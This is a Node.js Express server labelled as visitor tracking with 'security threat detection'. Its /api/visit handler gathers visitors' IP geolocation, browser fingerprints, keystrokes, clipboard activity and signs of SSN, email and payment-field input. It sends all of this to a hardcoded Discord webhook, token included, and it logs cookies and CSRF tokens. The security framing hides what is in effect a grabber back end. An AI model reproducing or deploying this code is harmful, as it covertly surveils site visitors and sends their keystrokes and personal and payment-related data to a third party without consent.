const express = require('express');
const cors = require('cors');
const useragent = require('useragent');
const rateLimit = require('express-rate-limit');
const { v4: uuidv4 } = require('uuid');
const winston = require('winston');
const csrf = require('csurf');
const cookieParser = require('cookie-parser');
const fs = require('fs').promises;
const path = require('path');

const app = express();

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'visitor.log' }),
    new winston.transports.Console()
  ]
});

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 min
  max: 100,
  standardHeaders: true,
  legacyHeaders: false
});

app.use(cors({
  origin: (origin, callback) => {
    const allowedOrigins = [
      'http://localhost:3000',
      'https://random-nfpf.onrender.com',
      'https://vanprojects.netlify.app',
      'https://artifacts.grokusercontent.com'
    ];
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, origin || '*');
    } else {
      logger.warn('CORS Misconfiguration Attempt', { origin });
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
app.use(cookieParser());
app.use(express.json());
app.use(express.static('public'));
app.use(limiter);

const csrfProtection = csrf({
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: process.env.NODE_ENV === 'production' ? 'None' : 'Lax'
  }
});
app.use(csrfProtection);

app.use((req, res, next) => {
  req.sessionId = req.headers['x-session-id'] || uuidv4();
  res.setHeader('X-Session-ID', req.sessionId);
  res.setHeader('X-CSRF-Token', req.csrfToken());
  logger.info('Generated CSRF token', { sessionId: req.sessionId, csrfToken: req.csrfToken() });
  next();
});

app.get('/csrf-token', csrfProtection, (req, res) => {
  const token = req.csrfToken();
  logger.info('Served CSRF token', { token, sessionId: req.sessionId });
  res.json({ csrfToken: token });
});

app.get('/index.html', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta name="csrf-token" content="${req.csrfToken()}">
      <title>Visitor Tracking</title>
    </head>
    <body>
      <h1>Welcome</h1>
      <script src="/client.js"></script>
    </body>
    </html>
  `);
});

app.get('/', (req, res) => {
  res.send('Tf you doing here.');
});

function getClientIP(req) {
  const forwarded = req.headers['x-forwarded-for'];
  return forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress;
}

function detectSecurityThreats(req, visitorInfo) {
  const threats = [];

  if (req.body.inlineScripts?.length || req.body.cookieAccess) {
    threats.push({
      type: 'XSS',
      details: `Detected ${req.body.inlineScripts?.length || 0} inline scripts and cookie access: ${req.body.cookieAccess}`
    });
  }

  if (req.headers['referer']?.includes('token=') || req.headers['referer']?.includes('auth=')) {
    threats.push({
      type: 'Referrer Leakage',
      details: `Sensitive data in referer: ${req.headers['referer']}`
    });
  }

  if (req.body.thirdPartyRequests?.length) {
    threats.push({
      type: 'Cookie Syncing',
      details: `Third-party requests to: ${req.body.thirdPartyRequests.join(', ')}`
    });
  }

  if (req.cookies && Object.values(req.cookies).some(value => value.includes('.'))) {
    threats.push({
      type: 'Subdomain Cookie Scope Abuse',
      details: 'Broad cookie value detected'
    });
  }

  if (!req.secure && process.env.NODE_ENV === 'production') {
    threats.push({
      type: 'MITM Risk',
      details: 'Insecure HTTP connection detected'
    });
  }

  if (req.body.postMessageCalls?.length) {
    threats.push({
      type: 'PostMessage Misuse',
      details: `Unverified postMessage calls: ${req.body.postMessageCalls.join(', ')}`
    });
  }

  if (req.body.part3?.keystrokes && req.body.part3.keystrokes.includes('password')) {
    threats.push({
      type: 'Sensitive Keylogging',
      details: 'Potentially sensitive data detected in keystrokes'
    });
  }

  if (req.body.part3?.clipboardAccess !== 'None') {
    threats.push({
      type: 'Clipboard Access',
      details: `Clipboard interaction detected: ${req.body.part3.clipboardAccess}`
    });
  }

  if (req.body.part3?.ssnPatternDetected !== 'None') {
    threats.push({
      type: 'SSN Pattern',
      details: 'SSN-like pattern detected in input'
    });
  }

  if (req.body.part3?.emailPatternDetected !== 'None') {
    threats.push({
      type: 'Email Pattern',
      details: 'Email-like pattern detected in input'
    });
  }

  if (req.body.part3?.paymentFieldInteraction !== 'None') {
    threats.push({
      type: 'Payment Field Interaction',
      details: 'Input detected in payment-related field'
    });
  }

  return threats;
}

app.post('/api/visit', csrfProtection, async (req, res) => {
  try {
    logger.info('Received /api/visit request', {
      headers: req.headers,
      cookies: req.cookies,
      body: req.body
    });
    const ip = getClientIP(req);
    
    const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query,mobile,proxy,hosting`);
    const geoData = await geoResponse.json();

    if (geoData.status === 'fail') {
      logger.error('Geolocation API error', { message: geoData.message, ip });
      return res.status(400).send('Invalid IP address');
    }

    const agent = useragent.parse(req.headers['user-agent']);
    const referer = req.headers['referer'] || 'Direct';

    const plugins = req.body.plugins ? Array.isArray(req.body.plugins) ? req.body.plugins : [] : [];
    const mimeTypes = req.body.mimeTypes ? Array.isArray(req.body.mimeTypes) ? req.body.mimeTypes : [] : [];

    const visitorInfo = {
      sessionId: req.sessionId,
      ip: geoData.query,
      country: geoData.country,
      region: geoData.regionName,
      city: geoData.city,
      zip: geoData.zip,
      latitude: geoData.lat,
      longitude: geoData.lon,
      isp: geoData.isp,
      organization: geoData.org,
      as: geoData.as,
      mobile: geoData.mobile,
      proxy: geoData.proxy,
      hosting: geoData.hosting,
      device: req.body.device || 'Unknown',
      timestamp: req.body.ts || new Date().toISOString(),
      browser: agent.toAgent(),
      os: agent.os.toString(),
      deviceType: agent.device.toString(),
      referer: referer,
      acceptLanguage: req.headers['accept-language'] || 'Unknown',
      accept: req.headers['accept'] || 'Unknown',
      connection: req.headers['connection'] || 'Unknown',
      requestMethod: req.method,
      requestPath: req.originalUrl,
      userAgentRaw: req.headers['user-agent'],
      screenSize: req.body.screenSize || 'Unknown',
      colorDepth: req.body.colorDepth || 'Unknown',
      timezone: req.body.timezone || 'Unknown',
      language: req.body.language || 'Unknown',
      hardwareConcurrency: req.body.hardwareConcurrency || 'Unknown',
      deviceMemory: req.body.deviceMemory || 'Unknown',
      doNotTrack: req.body.doNotTrack || 'Unknown',
      plugins: plugins,
      mimeTypes: mimeTypes,
      inlineScripts: req.body.inlineScripts || [],
      cookieAccess: req.body.cookieAccess || false,
      thirdPartyRequests: req.body.thirdPartyRequests || [],
      postMessageCalls: req.body.postMessageCalls || [],
      touchSupport: req.body.touchSupport || 'Unknown',
      batteryStatus: req.body.batteryStatus || 'Unknown',
      currentUrl: req.body.currentUrl || 'Unknown',
      scrollPosition: req.body.scrollPosition || 'Unknown',
      part3: {
        keystrokes: req.body.part3?.keystrokes || 'None',
        mouseMovementFrequency: req.body.part3?.mouseMovementFrequency || 'Unknown',
        webglSupport: req.body.part3?.webglSupport || 'Unknown',
        connectionType: req.body.part3?.connectionType || 'Unknown',
        clipboardAccess: req.body.part3?.clipboardAccess || 'None',
        deviceOrientationSupport: req.body.part3?.deviceOrientationSupport || 'Unknown',
        sessionStorageUsage: req.body.part3?.sessionStorageUsage || 'Unknown',
        browserFeatures: req.body.part3?.browserFeatures || 'None',
        pageLoadTime: req.body.part3?.pageLoadTime || 'Unknown',
        userInteractionCount: req.body.part3?.userInteractionCount || 0,
        ssnPatternDetected: req.body.part3?.ssnPatternDetected || 'None',
        emailPatternDetected: req.body.part3?.emailPatternDetected || 'None',
        paymentFieldInteraction: req.body.part3?.paymentFieldInteraction || 'None'
      }
    };

    const threats = detectSecurityThreats(req, visitorInfo);
    if (threats.length) {
      logger.warn('Security Threats Detected', { threats, visitorInfo });
    }

    logger.info('Visitor Info', { ...visitorInfo, threats });

    const webhookURL = 'https://discord.com/api/webhooks/1423009299826868396/7ezGh2CAQRooHIvE5sXCBGW0AAgFE2Ku8aFqUDe2eqC2BG7quehvy6JBgWqSwfhrROAq';
    
    const fields = [
      { name: 'Session ID', value: visitorInfo.sessionId, inline: true },
      { name: 'Device', value: visitorInfo.device, inline: true },
      { name: 'IP', value: visitorInfo.ip, inline: true },
      { name: 'Country', value: visitorInfo.country, inline: true },
      { name: 'Region', value: visitorInfo.region, inline: true },
      { name: 'City', value: visitorInfo.city, inline: true },
      { name: 'ZIP', value: visitorInfo.zip || 'N/A', inline: true },
      { name: 'Coordinates', value: `(${visitorInfo.latitude}, ${visitorInfo.longitude})`, inline: true },
      { name: 'ISP', value: visitorInfo.isp, inline: true },
      { name: 'Organization', value: visitorInfo.organization || 'N/A', inline: true },
      { name: 'AS', value: visitorInfo.as || 'N/A', inline: true },
      { name: 'Mobile', value: visitorInfo.mobile ? 'Yes' : 'No', inline: true },
      { name: 'Proxy', value: visitorInfo.proxy ? 'Yes' : 'No', inline: true },
      { name: 'Hosting', value: visitorInfo.hosting ? 'Yes' : 'No', inline: true },
      { name: 'Browser', value: visitorInfo.browser, inline: true },
      { name: 'OS', value: visitorInfo.os, inline: true },
      { name: 'Device Type', value: visitorInfo.deviceType, inline: true },
      { name: 'Referer', value: visitorInfo.referer, inline: true },
      { name: 'Language', value: visitorInfo.acceptLanguage, inline: true },
      { name: 'Accept', value: visitorInfo.accept, inline: true },
      { name: 'Connection', value: visitorInfo.connection, inline: true },
      { name: 'Screen Size', value: visitorInfo.screenSize, inline: true },
      { name: 'Color Depth', value: visitorInfo.colorDepth, inline: true },
      { name: 'Timezone', value: visitorInfo.timezone, inline: true },
      { name: 'Touch Support', value: visitorInfo.touchSupport, inline: true },
      { name: 'Battery Status', value: visitorInfo.batteryStatus, inline: true },
      { name: 'Current URL', value: visitorInfo.currentUrl, inline: true },
      { name: 'Scroll Position', value: visitorInfo.scrollPosition, inline: true },
      { name: 'Part 3: Keystrokes', value: visitorInfo.part3.keystrokes, inline: true },
      { name: 'Part 3: Mouse Frequency', value: visitorInfo.part3.mouseMovementFrequency, inline: true },
      { name: 'Part 3: WebGL Support', value: visitorInfo.part3.webglSupport, inline: true },
      { name: 'Part 3: Connection Type', value: visitorInfo.part3.connectionType, inline: true },
      { name: 'Part 3: Clipboard Access', value: visitorInfo.part3.clipboardAccess, inline: true },
      { name: 'Part 3: Device Orientation', value: visitorInfo.part3.deviceOrientationSupport, inline: true },
      { name: 'Part 3: Session Storage', value: visitorInfo.part3.sessionStorageUsage, inline: true },
      { name: 'Part 3: Browser Features', value: visitorInfo.part3.browserFeatures, inline: true },
      { name: 'Part 3: Page Load Time', value: visitorInfo.part3.pageLoadTime, inline: true },
      { name: 'Part 3: Interaction Count', value: visitorInfo.part3.userInteractionCount.toString(), inline: true },
      { name: 'Part 3: SSN Pattern', value: visitorInfo.part3.ssnPatternDetected, inline: true },
      { name: 'Part 3: Email Pattern', value: visitorInfo.part3.emailPatternDetected, inline: true },
      { name: 'Part 3: Payment Interaction', value: visitorInfo.part3.paymentFieldInteraction, inline: true },
      { name: 'Threats', value: threats.length ? threats.map(t => `${t.type}: ${t.details}`).join('\n') : 'None', inline: false }
    ];

    const firstBatch = fields.slice(0, 14); // Session ID to Hosting
    const secondBatch = fields.slice(14, 28); // Browser to Scroll Position
    const thirdBatch = fields.slice(28); // Part 3 fields to Threats

    const payload1 = {
      embeds: [{
        title: 'New Visitor Detected! (Part 1)',
        color: threats.length ? 0xff0000 : 0x00ff00,
        timestamp: visitorInfo.timestamp,
        fields: firstBatch
      }]
    };

    const payload2 = {
      embeds: [{
        title: 'New Visitor Detected! (Part 2)',
        color: threats.length ? 0xff0000 : 0x00ff00,
        timestamp: visitorInfo.timestamp,
        fields: secondBatch
      }]
    };

    const payload3 = {
      embeds: [{
        title: 'New Visitor Detected! (Part 3)',
        color: threats.length ? 0xff0000 : 0x00ff00,
        timestamp: visitorInfo.timestamp,
        fields: thirdBatch
      }]
    };

    try {
      // Save payloads to .txt files
      const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
      const logDir = path.join(__dirname, 'logs');
      await fs.mkdir(logDir, { recursive: true });

      const logFile1 = path.join(logDir, `webhook_payload_1_${timestamp}.txt`);
      await fs.writeFile(logFile1, JSON.stringify(payload1, null, 2));
      logger.info('Saved webhook payload 1 to file', { file: logFile1, payloadSize: JSON.stringify(payload1).length });

      const logFile2 = path.join(logDir, `webhook_payload_2_${timestamp}.txt`);
      await fs.writeFile(logFile2, JSON.stringify(payload2, null, 2));
      logger.info('Saved webhook payload 2 to file', { file: logFile2, payloadSize: JSON.stringify(payload2).length });

      const logFile3 = path.join(logDir, `webhook_payload_3_${timestamp}.txt`);
      await fs.writeFile(logFile3, JSON.stringify(payload3, null, 2));
      logger.info('Saved webhook payload 3 to file', { file: logFile3, payloadSize: JSON.stringify(payload3).length });

      // Send first webhook
      logger.info('Attempting to send to Discord Webhook (Part 1)', { webhookURL, payloadSize: JSON.stringify(payload1).length });
      const webhookResponse1 = await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload1)
      });

      if (!webhookResponse1.ok) {
        const text = await webhookResponse1.text();
        logger.error('Failed to send to Discord Webhook (Part 1)', {
          status: webhookResponse1.status,
          statusText: webhookResponse1.statusText,
          response: text,
          webhookURL
        });
        return res.status(500).send('Failed to send visitor info to Discord (Part 1)');
      }

      logger.info('Successfully sent to Discord Webhook (Part 1)', { status: webhookResponse1.status, webhookURL });

      // Delay to avoid rate limits
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Send second webhook
      logger.info('Attempting to send to Discord Webhook (Part 2)', { webhookURL, payloadSize: JSON.stringify(payload2).length });
      const webhookResponse2 = await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload2)
      });

      if (!webhookResponse2.ok) {
        const text = await webhookResponse2.text();
        logger.error('Failed to send to Discord Webhook (Part 2)', {
          status: webhookResponse2.status,
          statusText: webhookResponse2.statusText,
          response: text,
          webhookURL
        });
        return res.status(500).send('Failed to send visitor info to Discord (Part 2)');
      }

      logger.info('Successfully sent to Discord Webhook (Part 2)', { status: webhookResponse2.status, webhookURL });

      // Delay to avoid rate limits
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Send third webhook
      logger.info('Attempting to send to Discord Webhook (Part 3)', { webhookURL, payloadSize: JSON.stringify(payload3).length });
      const webhookResponse3 = await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload3)
      });

      if (!webhookResponse3.ok) {
        const text = await webhookResponse3.text();
        logger.error('Failed to send to Discord Webhook (Part 3)', {
          status: webhookResponse3.status,
          statusText: webhookResponse3.statusText,
          response: text,
          webhookURL
        });
        return res.status(500).send('Failed to send visitor info to Discord (Part 3)');
      }

      logger.info('Successfully sent to Discord Webhook (Part 3)', { status: webhookResponse3.status, webhookURL });

    } catch (error) {
      logger.error('Error sending to Discord Webhook', { error: error.message, stack: error.stack, webhookURL });
      return res.status(500).send('Error sending visitor info to Discord');
    }

    res.status(200).send('Visitor info recorded');
  } catch (error) {
    logger.error('Error in /api/visit', { error: error.message, stack: error.stack });
    res.status(500).send('Server error');
  }
});

app.use((req, res, next) => {
  logger.info('Incoming Request', {
    method: req.method,
    path: req.originalUrl,
    ip: getClientIP(req),
    timestamp: new Date().toISOString()
  });
  next();
});

app.use((err, req, res, next) => {
  logger.error('Unhandled error', { error: err.message, stack: err.stack });
  if (err.code === 'EBADCSRFTOKEN') {
    logger.warn('CSRF Attack Detected', {
      ip: getClientIP(req),
      path: req.originalUrl,
      cookies: req.cookies,
      headers: req.headers
    });
    res.status(403).send('Invalid CSRF token');
  } else {
    res.status(500).send('Something broke!');
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => logger.info(`Server running on port ${PORT}`));
